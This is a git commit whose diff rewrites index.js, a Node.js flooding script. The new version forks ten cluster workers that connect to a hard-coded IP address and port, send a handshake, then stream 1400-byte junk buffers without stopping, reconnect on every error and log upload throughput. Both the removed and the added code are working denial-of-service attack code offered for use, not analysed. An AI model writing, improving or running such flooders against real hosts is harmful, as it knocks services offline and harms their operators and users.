16ac9a8179ef82bd3e2be2925538e86e90579a56
XCRail Computer Science Task Force 810 <xcrailfans@gmail.com>
2016-08-26 10:57:54 +0800

    :+1:

--- index.js
+++ index.js
@@ -6,54 +6,81 @@
  */
 'use strict'
 
-const threads = require('threads')
+const cluster = require('cluster')
 const net = require('net')
 
-const host = '222.187.254.57'
-const port = '27305'
-const nick = ['xiaocao2015']
-const guys = 1
-
-var futa = 0 // :int
-var _up_ = 0
-
 const hellow = Buffer.from([0x07, 0x00, 0x04, 0x01, 0x30, 0x63, 0xdd, 0x01])
-const buffet = Buffer.from([...new Array(1400).keys()].map((i) => i%2))
+const buffet = Buffer.from([...new Array(1400).keys()].map((i) => 2 - i % 2))
 
-function ddoc(data, done){
-  let _TATP_ = 0
-  let suckit = new net.Socket()
-  let coming = () => {
-    return suckit.write(buffet, () => {
-      ++_TATP_
-      _up_ += 1400
+if (cluster.isMaster) {
+  const config = {
+    host: '222.187.254.57',
+    port: '27310',
+    nick: ['xiaocao2015']
+  }
+  const stat = {
+    futa: 0,
+    _up_: 0,
+    _TATP_: 0
+  }
+  const oldsuiPs = 10
+
+  const fuck = () => cluster.fork().on('message', (delta) => {
+    stat.futa += delta.futa
+    stat._up_ += delta._up_
+    stat._TATP_ += delta._TATP_
+    stat.futa = delta.futa < 0 ? 0 : stat.futa
+  }).on('exit', (w, c, sig) => {
+    if (w.exitedAfterDisconnect) fuck()
+  }).send(config)
+
+  for (let i = 0; i < oldsuiPs; i++) {
+    fuck()
+  }
+
+  setInterval(() => console.log(`${(stat._up_ /= 2) >> 10} KB/s up, ${stat.futa} futas coming.`), 500)
+} else if (cluster.isWorker) {
+  const macrossD = (futa, up, tatp) => {
+    process.send({
+      futa: futa,
+      _up_: up,
+      _TATP_: tatp
     })
   }
-  suckit.on('close', () => {
-    --futa
-    done(_TATP_)
-  })
-  suckit.on('data', () => {
-    coming()
-  })
-  suckit.connect({
-    port: port,
-    host: host,
-  }, function(){
-    ++futa
-    suckit.write(hellow)
-    coming()
+
+  let suckit = new net.Socket()
+  suckit.setMaxListeners(500)
+  suckit.setTimeout(1000)
+
+  process.on('message', ({host, port}) => {
+    const coming = () => {
+      suckit.write(buffet, () => {
+        macrossD(0, 1400, 1)
+      })
+    }
+
+    const shit = () => {
+      suckit.connect({
+        port: port,
+        host: host
+      }, () => {
+        suckit.write(hellow)
+        macrossD(1, 0, 0)
+        coming()
+      })
+    }
+
+    suckit.on('close', () => {
+      macrossD(-1, 0, 0)
+      process.exit(0)
+    })
+    suckit.on('data', () => {
+      coming()
+    })
+    suckit.on('error', (err) => {
+      setTimeout(shit, 1000)
+    })
+
+    shit()
   })
 }
-
-const pool = new threads.Pool(guys)
-pool.on('done', function(job, message) {
-  console.log('sent: ' + message)
-})
-;[...new Array(guys).keys()].forEach((i) => pool.run(ddoc).send('good'))
-
-function clearSpeed(){
-  console.log((_up_ /= 2) >> 10 + ' KB/s up, ' + futa + 'futas coming.')
-  setTimeout(clearSpeed, 500)
-}
-setTimeout(clearSpeed, 500)
